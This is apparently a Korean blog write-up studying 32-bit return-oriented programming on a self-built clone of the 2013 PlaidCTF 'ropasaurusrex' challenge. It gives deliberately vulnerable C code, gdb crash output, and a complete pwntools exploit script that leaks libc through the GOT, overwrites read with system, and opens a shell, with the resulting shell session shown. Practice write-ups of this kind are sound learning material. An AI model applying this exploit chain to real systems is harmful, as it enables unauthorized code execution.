# 상준이가 문제 줌#2-1
### Thx to s0ngsari

##### 32bit 환경에서의 ROP와 64bit 환경에서의 ROP 를 직접 해보고 Payload 구성의 차이를 알아보자.

###### 대상 : ropasaurusrex (2013 Plaid CTF)

---
##### ROP 를 공부하는 사람들이 필수적으로 접해보는 문제는?  
2013 년 PlaidCTF에 출제되었던 ropasaurusrex 이다.

이번 글은 군복무를 하면서 잃어버린 포너블의 감을 되 찾자는 의미에서

32bit ROP와 64bit ROP를 직접 해보고

Payload 구성에 있어 어떤 차이가 있는지 공부하기 위해 만들어 봤다.

※사실 이경원이 32bit도 못하는거 아니냐는 질문에 열받아서 쓴다.

ropasaurusrex 가 출제되었을 당시 libc가 같이 제공되었으나 왠지모르게... 바이너리만 돌아다닌다.

비교적 근사한 환경을 위해 ropasaurusrex 와 똑같은 파일을 만들어 보자.

```c
#include <stdio.h>

void function()
{
  char buf[128];
  read(0,buf,256);
}


int main()
{
  function();
  write(1,"win\n",4);
}

// compile option : -fno-stack-protector -m32
```

이제 알고 있던 지식을 조금씩 더듬으며 ROP를 해보자.

32bit의 경우 먼저 stack이 EIP 레지스터가 덮이는 위치를 확인해보자.

```
r <<< $(python -c 'print "A"*140')
Starting program: /home/secretpack/Desktop/roptech/ropprac <<< $(python -c 'print "A"*140')

Program received signal SIGSEGV, Segmentation fault.
0xf7fb53dc in __exit_funcs () from /lib/i386-linux-gnu/libc.so.6
```

```
r <<< $(python -c 'print "A"*144')
Starting program: /home/secretpack/Desktop/roptech/ropprac <<< $(python -c 'print "A"*144')

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
```

144byte를 쑤셔넣으니 EIP가 바뀐 것을 확인할 수 있다.

이제 쉘을 획득해야 하는데
```
secretpack@ubuntu:~/Desktop/roptech$ pwn checksec ropprac
[*] '/home/secretpack/Desktop/roptech/ropprac'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
ropsasurusrex와 똑같이 NX enable 이라 쉘코드를 쓸 수가 없다.

배웠던 내용들을 토대로 기억을 더듬으며 코드를 작성해보자

```python
from pwn import*

p = process("./ropprac")

elf = ELF('ropprac')
read_plt = elf.plt['read']
read_got = elf.got['read']
write_plt = elf.plt['write']
write_got = elf.got['write']
bss = elf.bss()
binsh = "/bin/sh\x00"
pppr = 0x80484f9
offset = 0x9ad60

payload = "A"*140
payload += p32(read_plt)
payload += p32(pppr)
payload += p32(0)
payload += p32(bss)
payload += p32(len(binsh)+1)

payload += p32(write_plt)
payload += p32(pppr)
payload += p32(1)
payload += p32(read_got)
payload += p32(4)

payload += p32(read_plt)
payload += "AAAA"
payload += p32(bss)

p.sendline(payload)
p.sendline(binsh)
sleep(1)

leak = u32(p.recv(4))
system = leak - offset

p.sendline(p32(system))
p.interactive()
```
물론 중간에 offset을 구하는 과정이라던가 pppr 가젯을 어떻게 가져왔는지는 생략되어있다.

* lld <binary name> 명령을 통해 어떤 라이브러리를 사용했는지 알 수 있다.
* 필자는 /lib/i386-lunux-gnu/libc.s0.6 파일이 사용되었다.
* gdb로 열어 p read, p system 명령을 통해 주소를 가져와 차를 구해 offset을 구할 수 있다.
* pop pop pop ret 가젯은 objdump -D <binary_name> 을 통해 구했다.

```
secretpack@ubuntu:~/Desktop/roptech$ python exp.py
[+] Starting local process './ropprac': pid 1149
[*] Switching to interactive mode
$ id
uid=1000(secretpack) gid=1000(secretpack) groups=1000(secretpack),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
```
##### 경원아 이정도는 할줄안다 이 ㅅㅂㄴㅇ
##### 다음에는 64bit에서의 ROP를 알아보자.
## 2부에서 계속
